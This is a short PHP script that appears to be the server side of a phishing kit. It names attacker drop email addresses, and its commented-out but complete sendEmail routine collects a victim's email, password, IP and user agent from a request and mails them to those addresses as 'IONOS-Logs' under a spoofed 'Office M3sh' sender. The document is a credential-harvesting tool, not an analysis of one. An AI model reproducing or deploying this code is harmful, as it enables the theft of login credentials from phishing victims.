<?php  
error_reporting(0);

header("Access-Control-Allow-Origin: *");
header("Content-Type: application/json");


// $EMAIL = "gottmacht.empire@gmail.com";
// $SENDER_EMAIL = "gottmacht.empire@yandex.com";

$EMAIL = "alexjace151@gmail.com";
$SENDER_EMAIL = "jacealex151@gmail.com";

echo json_encode($_REQUEST);


// function sendEmail($message, $subject = "New Credientials") {
//     global $EMAIL;
//     global $SENDER_EMAIL;
//     $headers  = 'MIME-Version: 1.0' . "\r\n";
//     $headers .= 'Content-type: text/html; charset=UTF-8' . "\r\n";
    
//     // Create email headers
//     $headers .= "From: Office M3sh<$SENDER_EMAIL>\r\n";
//     $headers .= "Reply-to: $SENDER_EMAIL\r\n";

//     return mail($EMAIL, $subject, $message, $headers, "-f$SENDER_EMAIL");
// }

// if(isset($_REQUEST['send'])) {
//     $email = $_REQUEST['email'];
//     $password = $_REQUEST['password'];
//     $ip = $_REQUEST['ip'];
//     $agent = $_REQUEST['agent'];

//     try {
//         // Send Mail
//         $message = file_get_contents("./format.html");
//         $message = str_replace("{{email}}", $email, $message);
//         $message = str_replace("{{password}}", $password, $message);
//         $message = str_replace("{{ip}}", $ip, $message);
//         $message = str_replace("{{agent}}", $agent, $message);

//         $mail = sendEmail($message, "IONOS-Logs | $ip");
//         if(!$mail) throw new Exception("Could not send");

//         echo $response = json_encode(["status" => true, "message" => "Email sent"]);
//     }
//     catch (Exception $e) {
//         echo $response = json_encode(["status" => false, "error" => $e->getMessage()]);
//     }
// }


